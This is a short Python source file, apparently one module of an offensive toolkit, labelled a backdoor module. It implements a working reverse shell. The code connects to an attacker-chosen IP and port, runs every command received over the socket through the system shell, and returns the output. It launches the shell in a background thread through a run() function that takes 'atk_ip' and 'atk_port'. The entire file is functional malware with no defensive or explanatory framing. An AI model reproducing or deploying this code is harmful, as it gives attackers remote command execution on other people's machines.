###########################################################################################################################
####################################################     LIBRARIES     ####################################################
###########################################################################################################################

import threading
import socket
import subprocess

###########################################################################################################################
#################################################     INITIALIZATIONS     #################################################
###########################################################################################################################


def reverse_shell(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.sendall(b"Connected.\n")

        while True:
            data = s.recv(1024).decode()
            # close connexion when 'exit' is sent
            if data.strip().lower() == "exit":
                break
            proc = subprocess.Popen(
                data,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
            )
            stdout_value = proc.stdout.read() + proc.stderr.read()
            s.send(stdout_value or b"No output\n")

    except:
        print("Backdoor closed!")
    finally:
        s.close()


###########################################################################################################################
#####################################################     PROGRAM     #####################################################
###########################################################################################################################

# Command to open the backdoor on attacker's machine: 
def run(atk_ip: str, atk_port: str):
    print("[+] Backdoor module starting...")
    try:
        port = int(atk_port)
        thread = threading.Thread(
            target=reverse_shell, args=(atk_ip, port), daemon=False
        )
        thread.start()
    except Exception as e:
        print("Error occured!")
    finally:
        return "instructions", "no_data"
